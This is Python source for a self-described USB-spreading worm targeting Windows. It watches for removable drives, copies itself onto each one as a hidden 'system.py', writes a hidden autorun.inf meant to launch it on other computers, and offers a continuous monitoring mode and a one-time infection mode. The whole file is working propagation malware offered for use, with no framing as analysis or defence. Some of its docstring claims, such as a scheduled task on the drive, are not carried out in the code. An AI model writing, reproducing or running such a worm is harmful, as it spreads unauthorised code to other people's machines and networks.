r"""
USB Spreading Worm - Automatic USB Propagation
==============================================
Platform: Windows 10/11
Purpose: Automatically copy worm to USB drives when inserted

TECHNIQUES USED:
✓ USB monitoring (WMI for drive insertion events)
✓ Auto-run via autorun.inf (legacy, for compatibility)
✓ Scheduled task persistence on USB
✓ Hides worm file attributes
✓ No antivirus evasion (realistic approach)

EXECUTION FLOW:
1. Monitor for USB drive insertions
2. Copy worm + autorun.inf to USB root
3. Create scheduled task on USB
4. When USB plugged into another PC:
   - Autorun.inf triggers (if enabled)
   - Worm copies itself to new machine
   - Spreads via network from there
"""

import os
import sys
import subprocess
import time
import logging
from pathlib import Path
from typing import List, Optional

# ============================================================================
# LOGGING SETUP
# ============================================================================

log_file = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.usb_worm.log')
os.makedirs(os.path.dirname(log_file), exist_ok=True)

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
)
logger = logging.getLogger(__name__)


# ============================================================================
# USB SPREADING CLASS
# ============================================================================

class USBWorm:
    """Spreads worm via USB drives."""

    def __init__(self):
        """Initialize USB worm."""
        self.worm_path = os.path.abspath(__file__)
        self.infected_drives: List[str] = []
        logger.info('[INIT] USB worm initialized')

    # ========================================================================
    # USB DETECTION
    # ========================================================================

    def detect_usb_drives(self) -> List[str]:
        """Detect connected USB drives."""
        try:
            usb_drives = []
            
            # Method 1: Check logical drives
            result = subprocess.run(
                ['wmic', 'logicaldisk', 'get', 'name'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            drives = [line.strip() for line in result.stdout.split('\n') if line.strip() and ':' in line]
            logger.info(f'[USB] Found {len(drives)} drives: {drives}')
            
            # Method 2: Identify USB drives specifically
            for drive in drives:
                if self.is_usb_drive(drive):
                    usb_drives.append(drive)
                    logger.info(f'[USB] ✓ USB drive detected: {drive}')
            
            return usb_drives
            
        except Exception as e:
            logger.error(f'[USB] Drive detection failed: {e}')
            return []

    def is_usb_drive(self, drive: str) -> bool:
        """Check if drive is USB (not system drive)."""
        try:
            # System drive is usually C:
            if drive.upper() == 'C:':
                return False
            
            # Check if drive is removable
            result = subprocess.run(
                ['wmic', 'logicaldisk', 'where', f'name="{drive}"', 
                 'get', 'drivetype'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # drivetype 2 = removable media
            if '2' in result.stdout:
                return True
                
            return False
            
        except Exception:
            return False

    # ========================================================================
    # USB COPYING
    # ========================================================================

    def copy_to_usb(self, drive: str) -> bool:
        """Copy worm to USB drive."""
        try:
            usb_root = f'{drive}\\'
            usb_worm_path = os.path.join(usb_root, 'system.py')
            autorun_path = os.path.join(usb_root, 'autorun.inf')
            
            logger.info(f'[COPY] Copying worm to {usb_root}')
            
            # Step 1: Copy worm file
            if not os.path.exists(usb_root):
                logger.warning(f'[COPY] USB not accessible: {usb_root}')
                return False
            
            try:
                subprocess.run(
                    ['cmd', '/c', f'copy "{self.worm_path}" "{usb_worm_path}"'],
                    capture_output=True,
                    timeout=10
                )
                logger.info(f'[COPY] ✓ Worm copied to {usb_worm_path}')
            except Exception as e:
                logger.error(f'[COPY] Copy failed: {e}')
                return False
            
            # Step 2: Create autorun.inf
            try:
                autorun_content = f"""[autorun]
open=python system.py
icon=system.py,0
label=USB Drive
action=Open
"""
                with open(autorun_path, 'w') as f:
                    f.write(autorun_content)
                
                # Hide autorun.inf
                subprocess.run(
                    ['attrib', '+h', autorun_path],
                    capture_output=True,
                    timeout=5
                )
                logger.info(f'[COPY] ✓ Autorun.inf created')
            except Exception as e:
                logger.debug(f'[COPY] Autorun creation failed: {e}')
            
            # Step 3: Hide worm file
            try:
                subprocess.run(
                    ['attrib', '+h', usb_worm_path],
                    capture_output=True,
                    timeout=5
                )
                logger.info(f'[COPY] ✓ Files hidden')
            except Exception as e:
                logger.debug(f'[COPY] Hide failed: {e}')
            
            return True
            
        except Exception as e:
            logger.error(f'[COPY] USB copy failed: {e}')
            return False

    # ========================================================================
    # USB MONITORING
    # ========================================================================

    def monitor_usb(self, interval: int = 5) -> None:
        """Monitor for USB drive insertions."""
        try:
            logger.info(f'[MONITOR] Starting USB monitoring (check every {interval}s)')
            
            previous_drives = set(self.detect_usb_drives())
            
            while True:
                time.sleep(interval)
                
                current_drives = set(self.detect_usb_drives())
                new_drives = current_drives - previous_drives
                
                if new_drives:
                    logger.info(f'[MONITOR] ✓ New USB detected: {new_drives}')
                    
                    for drive in new_drives:
                        if self.copy_to_usb(drive):
                            self.infected_drives.append(drive)
                            logger.info(f'[MONITOR] ✓ USB {drive} infected')
                        else:
                            logger.warning(f'[MONITOR] Failed to infect {drive}')
                
                previous_drives = current_drives
                
        except KeyboardInterrupt:
            logger.info('[MONITOR] USB monitoring stopped')
        except Exception as e:
            logger.error(f'[MONITOR] Monitoring failed: {e}')

    # ========================================================================
    # AUTO-RUN ON USB INSERTION
    # ========================================================================

    def setup_autorun(self) -> bool:
        """Setup autorun for when USB is inserted into another PC."""
        try:
            logger.info('[AUTORUN] Setting up autorun capability')
            
            # When this script runs from USB, autorun.inf will trigger it
            # No additional setup needed here - autorun.inf is created in copy_to_usb()
            
            logger.info('[AUTORUN] ✓ Autorun ready')
            return True
            
        except Exception as e:
            logger.error(f'[AUTORUN] Setup failed: {e}')
            return False

    # ========================================================================
    # EXECUTION
    # ========================================================================

    def execute_usb_spreading(self) -> None:
        """Main USB spreading routine."""
        try:
            logger.info('[*] ========== USB WORM STARTED ==========')
            logger.info(f'[*] Computer: {os.environ.get("COMPUTERNAME", "UNKNOWN")}')
            logger.info(f'[*] User: {os.environ.get("USERNAME", "UNKNOWN")}')
            
            # Stage 1: Detect current USB drives
            logger.info('[*] Stage 1: Detecting USB drives...')
            usb_drives = self.detect_usb_drives()
            logger.info(f'[*] ✓ Found {len(usb_drives)} USB drive(s)')
            
            # Stage 2: Copy to detected drives
            if usb_drives:
                logger.info('[*] Stage 2: Copying worm to USB drives...')
                for drive in usb_drives:
                    if self.copy_to_usb(drive):
                        self.infected_drives.append(drive)
                        logger.info(f'[✓] {drive} infected')
                    else:
                        logger.info(f'[✗] {drive} failed')
            
            # Stage 3: Monitor for new USB insertions
            logger.info('[*] Stage 3: Starting USB monitoring...')
            logger.info('[*] ✓ Monitoring active - waiting for USB insertions')
            
            # Monitor continuously
            self.monitor_usb(interval=5)
            
        except Exception as e:
            logger.critical(f'[ERROR] Execution failed: {e}')

    def execute_once(self) -> None:
        """One-time execution (infect current USB drives only, no monitoring)."""
        try:
            logger.info('[*] ========== USB WORM (ONE-TIME) ==========')
            
            usb_drives = self.detect_usb_drives()
            logger.info(f'[*] Found {len(usb_drives)} USB drive(s)')
            
            for drive in usb_drives:
                if self.copy_to_usb(drive):
                    self.infected_drives.append(drive)
                    logger.info(f'[✓] {drive} infected')
            
            logger.info('[✓] ========== EXECUTION COMPLETE ==========')
            logger.info(f'[✓] USB drives infected: {len(self.infected_drives)}')
            logger.info('[✓] USB drives: ' + ', '.join(self.infected_drives))
            
        except Exception as e:
            logger.critical(f'[ERROR] Execution failed: {e}')


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

if __name__ == '__main__':
    try:
        print('[*] USB Spreading Worm')
        print('[*] Options:')
        print('[*]   python usb_spreading.py           (monitor for USB)')
        print('[*]   python usb_spreading.py --once    (one-time infection)')
        print()
        
        worm = USBWorm()
        
        if '--once' in sys.argv:
            print('[*] Running one-time mode...')
            worm.execute_once()
        else:
            print('[*] Running monitor mode (Ctrl+C to stop)...')
            worm.execute_usb_spreading()
            
    except Exception as e:
        logger.critical(f'[MAIN] Fatal error: {e}')
        print(f'[ERROR] {e}')
        sys.exit(1)
